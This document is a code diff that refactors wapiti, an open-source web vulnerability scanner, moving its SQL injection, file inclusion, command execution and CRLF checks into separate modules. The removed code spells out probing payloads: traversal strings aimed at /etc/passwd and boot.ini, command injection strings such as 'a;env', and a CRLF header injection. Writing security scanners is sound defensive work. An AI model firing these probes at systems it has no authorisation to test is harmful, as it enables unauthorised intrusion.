@@ -28,6 +28,11 @@ import sys,re,getopt,os,random
 import BeautifulSoup
 import XSS, HTTP
 from xmlreportgenerator import XMLReportGenerator
+from sqlinjectionattack import SQLInjectionAttack
+from filehandlingattack import FileHandlingAttack
+from execattack import ExecAttack
+from crlfattack import CRLFAttack
+from vulnerability import Vulnerability
 
 class wapiti:
   """
@@ -120,19 +125,14 @@ Supported options are:
   xss_history={}
   GET_XSS={}
   HTTP=None
+  reportGen = None
+
   XSS=None
-  reporGen = None
-
-  #Constants
-  SQL_INJECTION = "Sql Injection"
-  FILE_HANDLING = "File Handling"
-  XSS = "Cross Site Scripting"
-  CRLF = "CRLF"
-  EXEC = "Commands execution"
-
-  HIGH_LEVEL_VULNERABILITY   = "1"
-  MEDIUM_LEVEL_VULNERABILITY = "2"
-  LOW_LEVEL_VULNERABILITY    = "3"
+  sqlInjectionAttack = None
+  fileHandlingAttack = None
+  execAttack = None
+  crlfAttack = None
+  attacks = []
 
   REPORT_DIR = "report"
 
@@ -146,14 +146,22 @@ Supported options are:
 
   def __initReport(self):
     if self.reportGeneratorType.lower() == "xml":
-        self.reporGen = XMLReportGenerator()
+        self.reportGen = XMLReportGenerator()
     else: #default
-        self.reporGen = XMLReportGenerator()
-    self.reporGen.addVulnerabilityType(self.SQL_INJECTION)
-    self.reporGen.addVulnerabilityType(self.FILE_HANDLING)
-    self.reporGen.addVulnerabilityType(self.XSS)
-    self.reporGen.addVulnerabilityType(self.CRLF)
-    self.reporGen.addVulnerabilityType(self.EXEC)
+        self.reportGen = XMLReportGenerator()
+    self.reportGen.addVulnerabilityType(Vulnerability.SQL_INJECTION)
+    self.reportGen.addVulnerabilityType(Vulnerability.FILE_HANDLING)
+    self.reportGen.addVulnerabilityType(Vulnerability.XSS)
+    self.reportGen.addVulnerabilityType(Vulnerability.CRLF)
+    self.reportGen.addVulnerabilityType(Vulnerability.EXEC)
+
+  def __initAttacks(self):
+    self.sqlInjectionAttack = SQLInjectionAttack(self.HTTP,self.reportGen)
+    self.fileHandlingAttack = FileHandlingAttack(self.HTTP,self.reportGen)
+    self.execAttack         = ExecAttack        (self.HTTP,self.reportGen)
+    self.crlfAttack         = CRLFAttack        (self.HTTP,self.reportGen)
+    self.attacks = [self.sqlInjectionAttack, self.fileHandlingAttack,
+                    self.execAttack, self.crlfAttack]
 
   def browse(self):
     self.myls.go()
@@ -161,6 +169,12 @@ Supported options are:
     self.forms=self.myls.getForms()
 
     self.HTTP=HTTP.HTTP(self.root,self.proxy,self.auth_basic,self.cookie)
+    self.__initAttacks()
+    for attack in self.attacks:
+      if self.color == 1:
+        attack.setColor()
+      attack.setVerbose(self.verbose)
+
     self.XSS=XSS.XSS(self.HTTP)
 
   def attack(self):
@@ -189,7 +203,7 @@ Supported options are:
       print "----------------------"
       for url in self.myls.getUploads():
         print url
-    self.reporGen.generateReport(self.REPORT_DIR+"/vulnerabilities.xml")
+    self.reportGen.generateReport(self.REPORT_DIR+"/vulnerabilities.xml")
     print "\nReport"
     print "------"
     print "A report has been generated in the file vulnerabilities.xml"
@@ -276,255 +290,21 @@ Supported options are:
     if query.find("=")>=0:
       for param in params:
         dict[param.split('=')[0]]=param.split('=')[1]
-    if self.doFileHandling==1: self.attackFileHandling(page,dict)
-    if self.doExec==1: self.attackExec(page,dict)
-    if self.doInjection==1: self.attackInjection(page,dict)
+    if self.doFileHandling==1: self.fileHandlingAttack.attackGET(page,dict,self.attackedGET)
+    if self.doExec==1:         self.execAttack        .attackGET(page,dict,self.attackedGET)
+    if self.doInjection==1:    self.sqlInjectionAttack.attackGET(page,dict,self.attackedGET)
+    if self.doXSS==1:          self.new_attackXSS(page,dict)
+    if self.doCRLF==1:         self.crlfAttack        .attackGET(page,dict,self.attackedGET)
     #if self.doXSS==1: self.attackXSS(page,dict)
-    if self.doXSS==1: self.new_attackXSS(page,dict)
-    if self.doCRLF==1: self.attackCRLF(page,dict)
 
   def attackPOST(self,form):
     if self.verbose==1:
       print "+ attackPOST "+form[0]
       print "  ",form[1]
-    if self.doFileHandling==1: self.attackFileHandling_POST(form)
-    if self.doExec==1: self.attackExec_POST(form)
-    if self.doInjection==1: self.attackInjection_POST(form)
-    if self.doXSS==1: self.attackXSS_POST(form)
-
-  def attackInjection(self,page,dict):
-    payload="\xbf'\"("
-    if dict=={}:
-      err=""
-      url=page+"?"+payload
-      if url not in self.attackedGET:
-        if self.verbose==2:
-          print "+ "+url
-        data,code=self.HTTP.send(url).getPageCode()
-        if data.find("You have an error in your SQL syntax")>=0:
-          err="MySQL Injection"
-        if data.find("supplied argument is not a valid MySQL")>0:
-          err="MySQL Injection"
-        if data.find("[Microsoft][ODBC Microsoft Access Driver]")>=0:
-          err="Access-Based SQL Injection"
-        if data.find("[Microsoft][ODBC SQL Server Driver]")>=0:
-          err="MSSQL-Based Injection"
-        if data.find("java.sql.SQLException: Syntax error or access violation")>=0:
-          err="Java.SQL Injection"
-        if data.find("PostgreSQL query failed: ERROR: parser:")>=0:
-          err="PostgreSQL Injection"
-        if data.find("XPathException")>=0:
-          err="XPath Injection"
-        if data.find("supplied argument is not a valid ldap")>=0 or data.find("javax.naming.NameNotFoundException")>=0:
-          err="LDAP Injection"
-        if data.find("DB2 SQL error:")>=0:
-          err="DB2 Injection"
-        if data.find("Dynamic SQL Error")>=0:
-          err="Interbase Injection"
-        if data.find("Sybase message:")>=0:
-          err="Sybase Injection"
-        if err!="":
-          self.reporGen.logVulnerability(self.SQL_INJECTION,
-                            self.HIGH_LEVEL_VULNERABILITY,
-                            url,payload,err+" (QUERY_STRING)")
-          print err,"(QUERY_STRING) in",page
-          print "\tEvil url:",url
-        else:
-          if code==500:
-            self.reporGen.logVulnerability(self.SQL_INJECTION,
-                              self.HIGH_LEVEL_VULNERABILITY,
-                              url,payload,"500 HTTP Error code")
-            print "500 HTTP Error code with"
-            print "\tEvil url:",url
-        self.attackedGET.append(url)
-    else:
-      for k in dict.keys():
-        err=""
-        tmp=dict.copy()
-        tmp[k]=payload
-        url=page+"?"+self.HTTP.encode(tmp)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          data,code=self.HTTP.send(url).getPageCode()
-          if data.find("You have an error in your SQL syntax")>=0:
-            err="MySQL Injection"
-          if data.find("supplied argument is not a valid MySQL")>0:
-            err="MySQL Injection"
-          if data.find("[Microsoft][ODBC Microsoft Access Driver]")>=0:
-            err="Access-Based SQL Injection"
-          if data.find("[Microsoft][ODBC SQL Server Driver]")>=0:
-            err="MSSQL-Based Injection"
-          if data.find("java.sql.SQLException: Syntax error or access violation")>=0:
-            err="Java.SQL Injection"
-          if data.find("PostgreSQL query failed: ERROR: parser:")>=0:
-            err="PostgreSQL Injection"
-          if data.find("XPathException")>=0:
-            err="XPath Injection"
-          if data.find("supplied argument is not a valid ldap")>=0 or data.find("javax.naming.NameNotFoundException")>=0:
-            err="LDAP Injection"
-          if data.find("DB2 SQL error:")>=0:
-            err="DB2 Injection"
-          if data.find("Dynamic SQL Error")>=0:
-            err="Interbase Injection"
-          if data.find("Sybase message:")>=0:
-            err="Sybase Injection"
-          if err!="":
-            if self.color==0:
-              self.reporGen.logVulnerability(self.SQL_INJECTION,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),
-                                err+" ("+k+")")
-              print err,"("+k+") in",page
-              print "\tEvil url:",url
-            else:
-              self.reporGen.logVulnerability(self.SQL_INJECTION,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),
-                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
-              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
-          else:
-            if code==500:
-              self.reporGen.logVulnerability(self.SQL_INJECTION,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),
-                                "500 HTTP Error code")
-              print "500 HTTP Error code with"
-              print "\tEvil url:",url
-          self.attackedGET.append(url)
-
-  def attackFileHandling(self,page,dict):
-    payloads=["http://www.google.fr/",
-              "/etc/passwd", "/etc/passwd\0", "c:\\\\boot.ini", "c:\\\\boot.ini\0",
-              "../../../../../../../../../../etc/passwd", # /.. is similar to / so one such payload is enough :)
-              "../../../../../../../../../../etc/passwd\0", # same with null byte
-              "../../../../../../../../../../boot.ini",
-              "../../../../../../../../../../boot.ini\0"]
-    if dict=={}:
-      warn=0
-      inc=0
-      err500=0
-      for payload in payloads:
-        err=""
-        url=page+"?"+self.HTTP.quote(payload)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          self.attackedGET.append(url)
-          if inc==1: continue
-          data,code=self.HTTP.send(url).getPageCode()
-          if data.find("root:x:0:0")>=0:
-            err="Unix include/fread"
-            inc=1
-          if data.find("[boot loader]")>=0:
-            err="Windows include/fread"
-            inc=1
-          if data.find("<title>Google</title>")>0:
-            err="Remote include"
-            inc=1
-          if data.find("java.io.FileNotFoundException:")>=0 and warn==0:
-            err="Warning Java include/open"
-            warn=1
-          if data.find("fread(): supplied argument is not")>0 and warn==0:
-            err="Warning fread"
-            warn=1
-          if data.find("fpassthru(): supplied argument is not")>0 and warn==0:
-            err="Warning fpassthru"
-            warn=1
-          if data.find("for inclusion (include_path=")>0 and warn==0:
-            err="Warning include"
-            warn=1
-          if data.find("Failed opening required")>=0 and warn==0:
-            err="Warning require"
-            warn=1
-          if data.find("<b>Warning</b>:  file(")>=0 and warn==0:
-            err="Warning file()"
-            warn=1
-          if data.find("<b>Warning</b>:  file_get_contents(")>=0:
-            err="Warning file_get_contents()"
-            warn=1
-          if err!="":
-            self.reporGen.logVulnerability(self.FILE_HANDLING,
-                              self.HIGH_LEVEL_VULNERABILITY,
-                              url,self.HTTP.quote(payload),
-                              str(err)+" (QUERY_STRING) in "+str(page))
-            print err,"(QUERY_STRING) in",page
-            print "\tEvil url:",url
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.FILE_HANDLING,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.quote(payload),
-                                "500 HTTP Error code")
-              print "500 HTTP Error code with"
-              print "\tEvil url:",url
-    for k in dict.keys():
-      warn=0
-      inc=0
-      err500=0
-      for payload in payloads:
-        err=""
-        tmp=dict.copy()
-        tmp[k]=payload
-        url=page+"?"+self.HTTP.encode(tmp)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          self.attackedGET.append(url)
-          if inc==1: continue
-          data,code=self.HTTP.send(url).getPageCode()
-          if data.find("root:x:0:0")>=0:
-            err="Unix include/fread"
-            inc=1
-          if data.find("[boot loader]")>=0:
-            err="Windows include/fread"
-            inc=1
-          if data.find("<title>Google</title>")>0:
-            err="Remote include"
-            inc=1
-          if data.find("java.io.FileNotFoundException:")>=0 and warn==0:
-            err="Warning Java include/open"
-            warn=1
-          if data.find("fread(): supplied argument is not")>0 and warn==0:
-            err="Warning fread"
-            warn=1
-          if data.find("fpassthru(): supplied argument is not")>0 and warn==0:
-            err="Warning fpassthru"
-            warn=1
-          if data.find("for inclusion (include_path=")>0 and warn==0:
-            err="Warning include"
-            warn=1
-          if data.find("Failed opening required")>=0 and warn==0:
-            err="Warning require"
-            warn=1
-          if data.find("<b>Warning</b>:  file(")>=0 and warn==0:
-            err="Warning file()"
-            warn=1
-          if data.find("<b>Warning</b>:  file_get_contents(")>=0:
-            err="Warning file_get_contents()"
-            warn=1
-          if err!="":
-            if self.color==0:
-              self.reporGen.logVulnerability(self.FILE_HANDLING,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),err+" ("+k+")")
-              print err,"("+k+") in",page
-              print "\tEvil url:",url
-            else:
-              self.reporGen.logVulnerability(self.FILE_HANDLING,
-                                self.HIGH_LEVEL_VULNERABILITY,url,self.HTTP.encode(tmp),
-                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
-              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.FILE_HANDLING,
-                                self.HIGH_LEVEL_VULNERABILITY,url,self.HTTP.encode(tmp),
-                                "500 HTTP Error code")
-              print "500 HTTP Error code with"
-              print "\tEvil url:",url
-
+    if self.doFileHandling==1: self.fileHandlingAttack.attackPOST(form,self.attackedPOST)
+    if self.doExec==1:         self.execAttack        .attackPOST(form,self.attackedPOST)
+    if self.doInjection==1:    self.sqlInjectionAttack.attackPOST(form,self.attackedPOST)
+    if self.doXSS==1:          self.attackXSS_POST(form)
 
   def new_attackXSS(self,page,dict):
     # page est l'url de script
@@ -570,15 +350,15 @@ Supported options are:
           print "+ "+url
         data,code=self.HTTP.send(url).getPageCode()
         if data.find(payload)>=0:
-          self.reporGen.logVulnerability(self.XSS,
-                            self.HIGH_LEVEL_VULNERABILITY,
+          self.reportGen.logVulnerability(Vulnerability.XSS,
+                            Vulnerability.HIGH_LEVEL_VULNERABILITY,
                             url,payload,"XSS (QUERY_STRING)")
           print "XSS (QUERY_STRING) in",page
           print "\tEvil url:",url
         else:
           if code==500:
-            self.reporGen.logVulnerability(self.XSS,
-                              self.HIGH_LEVEL_VULNERABILITY,
+            self.reportGen.logVulnerability(Vulnerability.XSS,
+                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                               url,payload,"500 HTTP Error code")
             print "500 HTTP Error code with"
             print "\tEvil url:",url
@@ -600,282 +380,28 @@ Supported options are:
         data,code=self.HTTP.send(url).getPageCode()
         if data.find(payload)>=0:
           if self.color==0:
-            self.reporGen.logVulnerability(self.XSS,
-                              self.HIGH_LEVEL_VULNERABILITY,
+            self.reportGen.logVulnerability(Vulnerability.XSS,
+                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                               url,self.HTTP.uqe(tmp),
                               "XSS ("+k+")")
             print "XSS ("+k+") in",page
             print "\tEvil url:",url
           else:
-            self.reporGen.logVulnerability(self.XSS,
-                              self.HIGH_LEVEL_VULNERABILITY,
+            self.reportGen.logVulnerability(Vulnerability.XSS,
+                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                               url,self.HTTP.uqe(tmp),
                               "XSS: "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
             print "XSS",":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
         else:
           if code==500:
-            self.reporGen.logVulnerability(self.XSS,
-                              self.HIGH_LEVEL_VULNERABILITY,
+            self.reportGen.logVulnerability(Vulnerability.XSS,
+                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                               url,self.HTTP.uqe(tmp),
                               "500 HTTP Error code")
             print "500 HTTP Error code with"
             print "\tEvil url:",url
         self.attackedGET.append(url)
 
-  def attackExec(self,page,dict):
-    payloads=["a;env",
-              "a);env",
-              "/e\0"]
-    if dict=={}:
-      warn=0
-      cmd=0
-      err500=0
-      for payload in payloads:
-        err=""
-        url=page+"?"+self.HTTP.quote(payload)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          self.attackedGET.append(url)
-          if cmd==1: continue
-          data,code=self.HTTP.send(url).getPageCode()
-          if data.find("eval()'d code</b> on line <b>")>=0 and warn==0:
-            err="Warning eval()"
-            warn=1
-          if data.find("PATH=")>=0 and data.find("PWD=")>=0:
-            err="Command execution"
-            cmd=1
-          if data.find("Cannot execute a blank command in")>=0 and warn==0:
-            err="Warning exec"
-            warn=1
-          if data.find("Fatal error</b>:  preg_replace")>=0 and warn==0:
-            err="preg_replace injection"
-            warn=1
-          if err!="":
-            self.reporGen.logVulnerability(self.EXEC,self.HIGH_LEVEL_VULNERABILITY,
-                              url,self.HTTP.quote(payload),err+" (QUERY_STRING)")
-            print err,"(QUERY_STRING) in",page
-            print "\tEvil url:",url
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.EXEC,self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.quote(payload),"500 HTTP Error code")
-              print "500 HTTP Error code with"
-              print "\tEvil url:",url
-    for k in dict.keys():
-      warn=0
-      cmd=0
-      err500=0
-      for payload in payloads:
-        err=""
-        tmp=dict.copy()
-        tmp[k]=payload
-        url=page+"?"+self.HTTP.encode(tmp)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          self.attackedGET.append(url)
-          if cmd==1: continue
-          data,code=self.HTTP.send(url).getPageCode()
-          if data.find("eval()'d code</b> on line <b>")>=0 and warn==0:
-            err="Warning eval()"
-            warn=1
-          if data.find("PATH=")>=0 and data.find("PWD=")>=0:
-            err="Command execution"
-            cmd=1
-          if data.find("Cannot execute a blank command in")>0 and warn==0:
-            err="Warning exec"
-            warn=1
-          if data.find("Fatal error</b>:  preg_replace")>=0 and warn==0:
-            err="preg_replace injection"
-            warn=1
-          if err!="":
-            if self.color==0:
-              self.reporGen.logVulnerability(self.EXEC,self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),err+" ("+k+")")
-              print err,"("+k+") in",page
-              print "\tEvil url:",url
-            else:
-              self.reporGen.logVulnerability(self.EXEC,self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),
-                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
-              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.EXEC,self.HIGH_LEVEL_VULNERABILITY,
-                                url,self.HTTP.encode(tmp),
-                                "500 HTTP Error code")
-              print "500 HTTP Error code with"
-              print "\tEvil url:",url
-
-  # Won't work with PHP >= 4.4.2
-  def attackCRLF(self,page,dict):
-    payload="http://www.google.fr\r\nWapiti: version 1.1.7-alpha"
-    if dict=={}:
-      err=""
-      url=page+"?"+payload
-      if url not in self.attackedGET:
-        if self.verbose==2:
-          print "+ "+url
-        if self.HTTP.send(url).getInfo().has_key('Wapiti'):
-          self.reporGen.logVulnerability(self.CRLF,self.HIGH_LEVEL_VULNERABILITY,
-                            page,payload,err+" (QUERY_STRING)")
-          print "CRLF Injection (QUERY_STRING) in",page
-          print "\tEvil url:",url
-        self.attackedGET.append(url)
-    else:
-      for k in dict.keys():
-        err=""
-        tmp=dict.copy()
-        tmp[k]=payload
-        url=page+"?"+self.HTTP.encode(tmp)
-        if url not in self.attackedGET:
-          if self.verbose==2:
-            print "+ "+url
-          if self.HTTP.send(url).getInfo().has_key('Wapiti'):
-            err="CRLF Injection"
-            if self.color==0:
-              self.reporGen.logVulnerability(self.CRLF,self.HIGH_LEVEL_VULNERABILITY,
-                                page,self.HTTP.encode(tmp),err+" ("+k+")")
-              print err,"("+k+") in",page
-              print "\tEvil url:",url
-            else:
-              self.reporGen.logVulnerability(self.CRLF,self.HIGH_LEVEL_VULNERABILITY,
-                                page,self.HTTP.encode(tmp).
-                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
-              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
-          self.attackedGET.append(url)
-
-  def attackInjection_POST(self,form):
-    payload="\xbf'\"("
-    page=form[0]
-    dict=form[1]
-    err=""
-    for k in dict.keys():
-      tmp=dict.copy()
-      tmp[k]=payload
-      if (page,tmp) not in self.attackedPOST:
-        headers={"Accept": "text/plain"}
-        if self.verbose==2:
-          print "+ "+page
-          print "  ",tmp
-        data,code=self.HTTP.send(page,self.HTTP.encode(tmp),headers).getPageCode()
-        if data.find("You have an error in your SQL syntax")>=0:
-          err="MySQL Injection"
-        if data.find("supplied argument is not a valid MySQL")>0:
-          err="MySQL Injection"
-        if data.find("[Microsoft][ODBC Microsoft Access Driver]")>=0:
-          err="Access-Based SQL Injection"
-        if data.find("[Microsoft][ODBC SQL Server Driver]")>=0:
-          err="MSSQL-Based Injection"
-        if data.find("java.sql.SQLException: Syntax error or access violation")>=0:
-          err="SQL Injection"
-        if data.find("PostgreSQL query failed: ERROR: parser:")>=0:
-          err="PostgreSQL Injection"
-        if data.find("XPathException")>=0:
-          err="XPath Injection"
-        if data.find("supplied argument is not a valid ldap")>=0 or data.find("javax.naming.NameNotFoundException")>=0:
-          err="LDAP Injection"
-        if data.find("DB2 SQL error:")>=0:
-          err="DB2 Injection"
-        if data.find("Dynamic SQL Error")>=0:
-          err="Interbase Injection"
-        if data.find("Sybase message:")>=0:
-          err="Sybase Injection"
-        if err!="":
-          self.reporGen.logVulnerability(self.SQL_INJECTION,
-                            self.HIGH_LEVEL_VULNERABILITY,
-                            page,self.HTTP.encode(tmp),
-                            err+" coming from "+form[2])
-          print err,"in",page
-          print "  with params =",self.HTTP.encode(tmp)
-          print "  coming from",form[2]
-        else:
-          if code==500:
-            self.reporGen.logVulnerability(self.SQL_INJECTION,
-                              self.HIGH_LEVEL_VULNERABILITY,
-                              page,self.HTTP.encode(tmp),
-                              "500 HTTP Error coming from "+form[2])
-            print "500 HTTP Error code in",page
-            print "  with params =",self.HTTP.encode(tmp)
-            print "  coming from",form[2]
-        self.attackedPOST.append((page,tmp))
-
-  def attackFileHandling_POST(self,form):
-    payloads=["http://www.google.fr/",
-              "/etc/passwd", "/etc/passwd\0", "c:\\\\boot.ini", "c:\\\\boot.ini\0",
-              "../../../../../../../../../../etc/passwd", # /.. is similar to / so one such payload is enough :)
-              "../../../../../../../../../../etc/passwd\0", # same with null byte
-              "../../../../../../../../../../boot.ini",
-              "../../../../../../../../../../boot.ini\0"]
-    page=form[0]
-    dict=form[1]
-    err=""
-    for payload in payloads:
-      warn=0
-      inc=0
-      err500=0
-      for k in dict.keys():
-        tmp=dict.copy()
-        tmp[k]=payload
-        if (page,tmp) not in self.attackedPOST:
-          self.attackedPOST.append((page,tmp))
-          if inc==1: continue
-          headers={"Accept": "text/plain"}
-          if self.verbose==2:
-            print "+ "+page
-            print "  ",tmp
-          data,code=self.HTTP.send(page,self.HTTP.encode(tmp),headers).getPageCode()
-          if data.find("root:x:0:0")>=0:
-            err="Unix include/fread"
-            inc=1
-          if data.find("[boot loader]")>=0:
-            err="Windows include/fread"
-            inc=1
-          if data.find("<title>Google</title>")>0:
-            err="Remote include"
-            inc=1
-          if data.find("java.io.FileNotFoundException:")>=0 and warn==0:
-            err="Warning Java include/open"
-            warn=1
-          if data.find("fread(): supplied argument is not")>0 and warn==0:
-            err="Warning fread"
-            warn=1
-          if data.find("fpassthru(): supplied argument is not")>0 and warn==0:
-            err="Warning fpassthru"
-            warn=1
-          if data.find("for inclusion (include_path=")>0 and warn==0:
-            err="Warning include"
-            warn=1
-          if data.find("Failed opening required")>=0 and warn==0:
-            err="Warning require"
-            warn=1
-          if data.find("<b>Warning</b>:  file(")>=0 and warn==0:
-            err="Warning file()"
-            warn=1
-          if data.find("<b>Warning</b>:  file_get_contents(")>=0:
-            err="Warning file_get_contents()"
-            warn=1
-          if err!="":
-            self.reporGen.logVulnerability(self.FILE_HANDLING,
-                              self.HIGH_LEVEL_VULNERABILITY,
-                              page,self.HTTP.encode(tmp),
-                              err+" coming from "+form[2])
-            print err,"in",page
-            print "  with params =",self.HTTP.encode(tmp)
-            print "  coming from",form[2]
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.FILE_HANDLING,
-                                self.HIGH_LEVEL_VULNERABILITY,
-                                page,self.HTTP.encode(tmp),
-                                "500 HTTP Error coming from "+form[2])
-              print "500 HTTP Error code in",page
-              print "  with params =",self.HTTP.encode(tmp)
-              print "  coming from",form[2]
 
   def attackXSS_POST(self,form):
     # TODO : history / attackedPOST
@@ -899,56 +425,6 @@ Supported options are:
         #mais en se basant seulement sur page cible+params
         #self.attackedPOST.append((page,tmp))
 
-  def attackExec_POST(self,form):
-    payloads=["a;env",
-              "a);env",
-              "/e\0"]
-    page=form[0]
-    dict=form[1]
-    err=""
-    for payload in payloads:
-      warn=0
-      cmd=0
-      err500=0
-      for k in dict.keys():
-        tmp=dict.copy()
-        tmp[k]=payload
-        if (page,tmp) not in self.attackedPOST:
-          self.attackedPOST.append((page,tmp))
-          if cmd==1: continue
-          headers={"Accept": "text/plain"}
-          if self.verbose==2:
-            print "+ "+page
-            print "  ",tmp
-          data,code=self.HTTP.send(page,self.HTTP.encode(tmp),headers).getPageCode()
-          if data.find("eval()'d code</b> on line <b>")>=0 and warn==0:
-            err="Warning eval()"
-            warn=1
-          if data.find("PATH=")>=0 and data.find("PWD=")>=0:
-            err="Command execution"
-            cmd=1
-          if data.find("Cannot execute a blank command in")>0 and warn==0:
-            err="Warning exec"
-            warn=1
-          if data.find("Fatal error</b>:  preg_replace")>=0 and warn==0:
-            err="preg_replace injection"
-            warn=1
-          if err!="":
-            self.reporGen.logVulnerability(self.XSS,self.HIGH_LEVEL_VULNERABILITY,
-                              page,self.HTTP.encode(tmp),
-                              err+" coming from "+form[2])
-            print err,"in",page
-            print "  with params =",self.HTTP.encode(tmp)
-            print "  coming from",form[2]
-          else:
-            if code==500 and err500==0:
-              err500=1
-              self.reporGen.logVulnerability(self.XSS,self.HIGH_LEVEL_VULNERABILITY,
-                                page,self.HTTP.encode(tmp),
-                                "500 HTTP Error code coming from "+form[2])
-              print "500 HTTP Error code in",page
-              print "  with params =",self.HTTP.encode(tmp)
-              print "  coming from",form[2]
 
   def permanentXSS(self,url):
     data=self.HTTP.send(url).getPage()
@@ -956,16 +432,16 @@ Supported options are:
       if data.find(code):
         if self.XSS.validXSS(data,code):
           print "Found permanent XSS with ",self.GET_XSS[code].replace(code,"<XSS>")
-          self.reporGen.logVulnerability(self.XSS,
-                            self.HIGH_LEVEL_VULNERABILITY,url,"",
+          self.reportGen.logVulnerability(Vulnerability.XSS,
+                            Vulnerability.HIGH_LEVEL_VULNERABILITY,url,"",
                             "Found permanent XSS with "+self.GET_XSS[code].replace(code,"<XSS>"))
     # TODO
     p=re.compile("<script>var XSS[_]?[0-9]{9,10};</script>")
     for s in p.findall(data):
       s=s.split(";")[0].split('XSS')[1].replace("_","-")
       if self.xss_history.has_key(int(s)):
-        self.reporGen.logVulnerability(self.XSS,
-                          self.HIGH_LEVEL_VULNERABILITY,url,"",
+        self.reportGen.logVulnerability(Vulnerability.XSS,
+                          Vulnerability.HIGH_LEVEL_VULNERABILITY,url,"",
                           "Found permanent XSS attacked by "+self.xss_history[int(s)][0]+
                           " with field "+self.xss_history[int(s)][1])
         print "Found permanent XSS in",url
